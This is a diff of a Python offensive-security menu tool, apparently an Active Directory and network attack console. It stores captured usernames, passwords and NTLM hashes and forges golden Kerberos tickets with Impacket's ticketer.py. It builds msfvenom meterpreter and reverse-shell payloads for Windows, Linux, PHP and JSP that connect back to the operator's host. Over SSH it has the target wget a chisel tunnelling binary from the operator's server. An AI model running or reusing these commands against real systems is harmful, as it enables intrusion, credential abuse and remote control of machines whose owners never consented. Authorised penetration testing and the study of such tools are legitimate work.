+   localCOM("echo '" + USR + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + PAS + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + NTM + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + TGT + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + DOM + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + SID + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + SDM + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + FIL + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + TSH + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + UN1 + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + UN2 + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + UN3 + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   localCOM("echo '" + UN4 + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
+   parsFile("base64.tmp")   
+   OSF2 = linecache.getline("base64.tmp", 1).rstrip("\n")  
+   COM2 = linecache.getline("base64.tmp", 2).rstrip("\n")
+   DNS2 = linecache.getline("base64.tmp", 3).rstrip("\n")
+   TIP2 = linecache.getline("base64.tmp", 4).rstrip("\n")
+   POR2 = linecache.getline("base64.tmp", 5).rstrip("\n")
+   PTS2 = linecache.getline("base64.tmp", 6).rstrip("\n")
+   WEB2 = linecache.getline("base64.tmp", 7).rstrip("\n")
+   WAF2 = linecache.getline("base64.tmp", 8).rstrip("\n")
+   HST2 = linecache.getline("base64.tmp", 9).rstrip("\n")
+   CSP2 = linecache.getline("base64.tmp", 10).rstrip("\n")
+   XOP2 = linecache.getline("base64.tmp", 11).rstrip("\n")
+   CON2 = linecache.getline("base64.tmp", 12).rstrip("\n")   
+   USR2 = linecache.getline("base64.tmp", 13).rstrip("\n")
+   PAS2 = linecache.getline("base64.tmp", 14).rstrip("\n")
+   NTM2 = linecache.getline("base64.tmp", 15).rstrip("\n")
+   TGT2 = linecache.getline("base64.tmp", 16).rstrip("\n")
+   DOM2 = linecache.getline("base64.tmp", 17).rstrip("\n")
+   SID2 = linecache.getline("base64.tmp", 18).rstrip("\n")
+   SDM2 = linecache.getline("base64.tmp", 19).rstrip("\n")      
+   FIL2 = linecache.getline("base64.tmp", 20).rstrip("\n")
+   TSH2 = linecache.getline("base64.tmp", 21).rstrip("\n")
+   UN12 = linecache.getline("base64.tmp", 22).rstrip("\n")  
+   UN22 = linecache.getline("base64.tmp", 23).rstrip("\n")
+   UN32 = linecache.getline("base64.tmp", 24).rstrip("\n")
+   UN42 = linecache.getline("base64.tmp", 25).rstrip("\n")   
+   cursor.execute("UPDATE REMOTETARGET SET OSF = \"" + OSF2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET COM = \"" + COM2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET DNS = \"" + DNS2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET TIP = \"" + TIP2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET POR = \"" + POR2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET PTS = \"" + PTS2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET WEB = \"" + WEB2 + "\" WHERE IDS = 1"); connection.commit() 
+   cursor.execute("UPDATE REMOTETARGET SET WAF = \"" + WAF2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET HST = \"" + HST2 + "\" WHERE IDS = 1"); connection.commit()    
+   cursor.execute("UPDATE REMOTETARGET SET CSP = \"" + CSP2 + "\" WHERE IDS = 1"); connection.commit()    
+   cursor.execute("UPDATE REMOTETARGET SET XOP = \"" + XOP2 + "\" WHERE IDS = 1"); connection.commit()    
+   cursor.execute("UPDATE REMOTETARGET SET CON = \"" + CON2 + "\" WHERE IDS = 1"); connection.commit()          
+   cursor.execute("UPDATE REMOTETARGET SET USR = \"" + USR2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET PAS = \"" + PAS2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET NTM = \"" + NTM2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET TGT = \"" + TGT2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET DOM = \"" + DOM2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET SID = \"" + SID2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET SDM = \"" + SDM2 + "\" WHERE IDS = 1"); connection.commit()          
+   cursor.execute("UPDATE REMOTETARGET SET FIL = \"" + FIL2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET TSH = \"" + TSH2 + "\" WHERE IDS = 1"); connection.commit() 
+   cursor.execute("UPDATE REMOTETARGET SET UN1 = \"" + UN12 + "\" WHERE IDS = 1"); connection.commit()    
+   cursor.execute("UPDATE REMOTETARGET SET UN2 = \"" + UN22 + "\" WHERE IDS = 1"); connection.commit()    
+   cursor.execute("UPDATE REMOTETARGET SET UN3 = \"" + UN32 + "\" WHERE IDS = 1"); connection.commit()    
+   cursor.execute("UPDATE REMOTETARGET SET UN4 = \"" + UN42 + "\" WHERE IDS = 1"); connection.commit()             
    return
 
 # -------------------------------------------------------------------------------------
@@ -1001,25 +1053,37 @@ else:
    print("[+] File tokens.txt already exists...")   
    
 screenLength = 28
+
+HST = "UNKNOWN                                 "
+CSP = "UNKNOWN                                 "
+XOP = "UNKNOWN                                 "
+CON = "UNKNOWN                                 "
+SDM = "EMPTY                                   "
+UN1 = "EMPTY                                   "
+UN2 = "EMPTY                                   "
+UN3 = "EMPTY                                   "
+UN4 = "EMPTY                                   "
+UN5 = "EMPTY                                   "
+UN6 = "EMPTY                                   "
+UN7 = "EMPTY                                   "
+WAF = "UNKNOWN                                 "
    
 SKEW = 0                                	# TIME-SKEW SWITCH
 DOMC = 0                                	# DOMAIN SWITCH
 DOMC2 = 0					# SUB DOMAIN SWITCH
 DNSC = 0                                	# DNS SWITCH
 HTTP = 0					# HTTP SERVER PORT
-
 COL0 = 19					# MAX LEN COMPUTER NAME
 COL1 = 40                               	# MAX LEN SESSION DATA
 COL2 = 44                               	# MAX LEN SHARE NAME
 COL3 = 23                               	# MAX LEN USER NAME
 COL4 = 32                               	# MAX LEN NTLM HASH
 COL5 = 1                                	# MAX LEN TOKEN VALUE
-
 SHAR = [" "*COL2]*maxUser			# SHARE NAMES
 USER = [" "*COL3]*maxUser			# USER NAMES
 HASH = [" "*COL4]*maxUser			# NTLM HASH
 VALD = ["0"*COL5]*maxUser			# USER TOKENS
-			
+
 portsTCP = ["EMPTY"]*screenLength		# TCP PORTS [x]
 portsUDP = ["EMPTY"]*screenLength		# UDP PORTS [x] 
 servsTCP = [" "*COL4]*screenLength      	# TCP SERVICE BANNER
@@ -1053,20 +1117,6 @@ coloum_one_Labels[23] = "COMMUNITY  "
 coloum_one_Labels[24] = "FUZZ  RIDER"
 coloum_one_Labels[25] = "WORD   LIST" 
 
-HST = "UNKNOWN                                 "
-CSP = "UNKNOWN                                 "
-XOP = "UNKNOWN                                 "
-CON = "UNKNOWN                                 "
-SDM = "EMPTY                                   "
-UN1 = "EMPTY                                   "
-UN2 = "EMPTY                                   "
-UN3 = "EMPTY                                   "
-UN4 = "EMPTY                                   "
-UN5 = "EMPTY                                   "
-UN6 = "EMPTY                                   "
-UN7 = "EMPTY                                   "
-WAF = "UNKNOWN                                 "
-
 communityString = "public                                  "
 FuzzRider = "--hl 0                                  "
 currentWordlist = "/usr/share/seclists/Discovery/Web-Content/common.txt"
@@ -1081,7 +1131,6 @@ currentWordlist = "/usr/share/seclists/Discovery/Web-Content/common.txt"
 
 print("[+] Configuration database found - restoring saved data....")
 col = cursor.execute("SELECT * FROM REMOTETARGET WHERE IDS = 1").fetchone()
-
 localCOM("echo " + col[1]  + " | base64 -d >  ascii.tmp")
 localCOM("echo " + col[2]  + " | base64 -d >>  ascii.tmp")
 localCOM("echo " + col[3]  + " | base64 -d >>  ascii.tmp")
@@ -1107,7 +1156,6 @@ localCOM("echo " + col[22]  + " | base64 -d >>  ascii.tmp")
 localCOM("echo " + col[23]  + " | base64 -d >>  ascii.tmp")
 localCOM("echo " + col[24]  + " | base64 -d >>  ascii.tmp")
 localCOM("echo " + col[25]  + " | base64 -d >>  ascii.tmp")
-
 OSF = linecache.getline("ascii.tmp", 1).rstrip("\n")
 COM = linecache.getline("ascii.tmp", 2).rstrip("\n")
 DNS = linecache.getline("ascii.tmp", 3).rstrip("\n")
@@ -1133,13 +1181,11 @@ UN1 = linecache.getline("ascii.tmp", 22).rstrip("\n")
 UN2 = linecache.getline("ascii.tmp", 23).rstrip("\n")
 UN3 = linecache.getline("ascii.tmp", 24).rstrip("\n")
 UN4 = linecache.getline("ascii.tmp", 25).rstrip("\n")
-
 if USR.rstrip(" ") == "":
    USR = "\'\'"   
 if PAS.rstrip(" ") == '':
    PAS = "\'\'"
 POR = PTS
-
 OSF = spacePadding(OSF, COL1)
 COM = spacePadding(COM, COL0)
 DNS = spacePadding(DNS, COL1)
@@ -1220,14 +1266,6 @@ while True:
    dispMenu()								# DISPLAY UPPER
    options()								# DISPLAY LOWER
    selection=input("[?] Please select an option: ")			# SELECT CHOICE
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - Secret option that autofill's PORTS, DOMAIN, SID, SHARES, USERS etc.
-# Modified: N/A
-# -------------------------------------------------------------------------------------
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1473,8 +1511,7 @@ while True:
                if b == 0: CSP = spacePadding("NOT FOUND - POSSIBLE CROSSSITE SCRIPTING", COL1)
                if c == 0: XOP = spacePadding("NOT FOUND - POSSIBLE CLICKJACKING ATTACK", COL1)
                if d == 0: CON = spacePadding("NOT FOUND - POSSIBLE MIME VULNERABILITY", COL1)
-         localCOM("rm securityheaders1.txt")
-      
+         localCOM("rm securityheaders1.txt")      
       if os.path.isfile("securityheaders2.txt"): # Port 443
          with open("securityheaders2.txt") as search:
             a = 0
@@ -1849,9 +1886,7 @@ while True:
          print("[+]  Wordlist succesfully changed...")
       if len(currentWordlist) < COL1:
          currentWordlist = spacePadding(currentWordlist, COL1)
-         
-         
-      #CHECK EXSITS AT SOME STAGE!
+      # ADD CHECK EXSITS AT SOME STAGE!
       prompt()      
                   
 # ------------------------------------------------------------------------------------- 
@@ -2232,7 +2267,6 @@ while True:
          checkParam = test_DOM()      
       if checkParam != 1:
          remoteCOM(keyPath + "rpcdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
-
       stringBindings = input("[?] Enter a valid stringbinding value, such as 'ncacn_ip_tcp:" + DOM.rstrip(" ") + "[135]' : ")            
       if checkParam != 1:
          if NTM[:5] != "EMPTY":
@@ -2781,7 +2815,6 @@ while True:
          checkParam = test_USR()         
       if checkParam != 1:
          print(colored("[*] Trying to create golden TGT for user " + USR.rstrip(" ") + "...", colour3))         
-         
          if (NTM[:1] != "") & (SID[:1] != ""):
             print("[i] Using HASH value as password credential...")
             remoteCOM(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))                        
@@ -3042,10 +3075,8 @@ while True:
             if TIP[:5] != "EMPTY":
                localCOM("msfvenom -p windows/x64/meterpreter_bind_tcp        RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParam + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
                localCOM("msfvenom -p windows/meterpreter_bind_tcp            RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParam + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
-
-#            localCOM("msfvenom -p cmd/windows/reverse_powershell  	     LHOST=" + localIP + "         LPORT=" + checkParam + "          -o " + explDir + "staged/cmd_windows_x86_reverse_powershell.bat >> arsenal.tmp 2>&1")
-#            localCOM("msfvenom -p windows/meterpreter/reverse_tcp --platform Windows -e x86/shikata_ga_nai -i 127 LHOST=" + localIP + " LPORT=" + checkParam + " -f exe -o " + explDir + "staged/windows_x86_meterpreter_encoded_reverse_tcp.exe >> arsenal.tmp 2>&1")
-            
+#              localCOM("msfvenom -p cmd/windows/reverse_powershell  	     LHOST=" + localIP + "         LPORT=" + checkParam + "          -o " + explDir + "staged/cmd_windows_x86_reverse_powershell.bat >> arsenal.tmp 2>&1")
+#              localCOM("msfvenom -p windows/meterpreter/reverse_tcp --platform Windows -e x86/shikata_ga_nai -i 127 LHOST=" + localIP + " LPORT=" + checkParam + " -f exe -o " + explDir + "staged/windows_x86_meterpreter_encoded_reverse_tcp.exe >> arsenal.tmp 2>&1")
          if OSF[:5] == "LINUX":
             print(colored("[*] Creating linux exploits...", colour3))
             localCOM("msfvenom -p linux/x86/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParam + " -f elf   -o " + explDir + "/linux_x86_meterpreter_reverse_tcp.elf>> arsenal.tmp 2>&1")
@@ -3054,7 +3085,6 @@ while True:
             localCOM("msfvenom -p linux/x64/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParam + " -f elf   -o " + explDir + "/linux_x64_meterpreter_reverse_http.elf >> arsenal.tmp 2>&1")
             localCOM("msfvenom -p linux/x86/meterpreter/bind_tcp             RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParam + " -f elf   -o " + explDir + "/linux_x86_meterpreter_bind_tcp.elf >> arsenal.tmp 2>&1")
             localCOM("msfvenom -p linux/x64/shell_bind_tcp                   RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParam + " -f elf   -o " + explDir + "/linux_x66_shell_bind_tcp.elf >> arsenal.tmp 2>&1")         
-
          if OSF[:7] == "ANDROID":
             print(colored("[*] Creating android exploits...", colour3))
 #           localCOM("msfvenom -p android/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParam + " R        -o " + explDir + "/android_reverse_shell.apk >> arsenal.tmp 2>&1")
@@ -3068,7 +3098,6 @@ while True:
          if OSF[:3] == "IOS":
             print(colored("[*] Creating ios exploits...", colour3))
             print("NOT IMPLEMENTED")            
-
          print(colored("[*] Creating other exploits that you might require...", colour3))
          localCOM("msfvenom -p php/reverse_php                            LHOST=" + localIP + "         LPORT=" + checkParam + " -f raw    -o " + explDir + "/php_reverse_php.php >> arsenal.tmp 2>&1")
          localCOM("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParam + " -f raw    -o " + explDir + "/jajava_jsp_shell_reverse_tcp.jsp >> arsenal.tmp 2>&1")
@@ -4350,7 +4379,6 @@ while True:
                print(colored("\n" + output, colour6))
          except:
             print("[-] Looks like something is missing..")
-
 # OLD ACL PWN CODE      
 #         BH1 = input("[+] Enter Neo4j username: ")
 #         BH2 = input("[+] Enter Neo4j password: ")                  
@@ -4721,8 +4749,7 @@ while True:
       dispBanner("HTTP SERVER",0) 
       localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
       localCOM("xdotool type '" + choice + "'; xdotool key Return")
-      localCOM("xdotool key Ctrl+Tab")     
-
+      localCOM("xdotool key Ctrl+Tab")
       portChoice = input("[?] Please enter the receiving port number: ")
       if portChoice.isnumeric():
          targetChoice = input("[?] Please enter the target port number: ")
@@ -4734,14 +4761,11 @@ while True:
          localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
          localCOM("xdotool type './" + httpDir + "/linux/lin_chisel64 server --port " + portChoice + " --reverse --socks5'; xdotool key Return")
          localCOM("xdotool key Ctrl+Tab")      
-      
       print(colored("[*] Connecting to remote server...", colour3))
       ssh = paramiko.SSHClient()
       ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-      ssh.connect('' + DOM.rstrip(" "), username='' + USR.rstrip(" "), password='' + PAS.rstrip(" "))    
-      
+      ssh.connect('' + DOM.rstrip(" "), username='' + USR.rstrip(" "), password='' + PAS.rstrip(" "))      
       if OSF[:5] == "LINUX":
-
             print("[+] Installing lin_chisel64, please wait...")
             ssh_command("cd /; mkdir tmp")
             ssh_command("cd /; cd /tmp; wget http://" + localIP2.rstrip(" ") + ":5678/TREADSTONE/linux/lin_chisel64 ./lin_chisel64")
